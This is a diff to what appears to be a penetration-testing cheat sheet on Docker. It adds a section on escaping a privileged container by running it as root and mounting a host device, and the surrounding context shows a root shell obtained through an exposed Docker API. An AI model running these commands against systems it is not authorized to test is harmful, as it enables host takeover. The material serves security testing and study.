@@ -148,6 +148,22 @@ $ docker -H <RHOST>:2375 run -it aa02ba520ac9 /bin/sh
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
 ```
 
+### Container Escape through Privileged Containers
+
+#### Access Privileged Container
+
+```c
+$ sudo docker exec -it --privileged -u root <CONTAINER> bash
+```
+
+#### Mount available Files from the Host
+
+```c
+$ mkdir -p /mnt/<FOLDER>
+$ mount /dev/<FILE> /mnt/<FOLDER>/
+$ cd /mnt/<FOLDER>
+```
+
 ### Container Escape by exploiting cgroups
 
 #### Requirements
